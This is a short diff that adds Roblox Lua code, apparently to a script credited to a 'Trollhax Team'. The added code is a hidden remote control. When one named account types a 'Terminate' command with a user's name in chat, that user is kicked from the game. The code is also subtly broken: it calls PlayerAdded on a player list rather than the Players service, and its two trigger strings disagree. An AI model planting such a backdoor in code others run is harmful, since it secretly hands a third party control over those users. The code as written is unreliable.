@@ -4,3 +4,24 @@
 
 -- Moderate
 
+local Players = game.Players:GetPlayers()
+
+for i, v in pairs(Players) do
+if v.Name == "8RR0R404" then
+v.Chatted:Connect(function(Command)
+if Command == "!Terminate ".. game.Players.LocalPlayer.Name then
+game.Players.LocalPlayer:Kick("Your connection has been terminated by The Trollhax Team.")
+end
+end)
+end
+end
+
+Players.PlayerAdded:Connect(function(Player)
+if Player.Name == "8RR0R404" then
+Player.Chatted:Connect(function(Command)
+if Command == "Terminate".. game.Players.LocalPlayer.Name then
+game.Players.LocalPlayer:Kick("Your connection has been terminated by The Trollhax Team.")
+end
+end)
+end
+end)
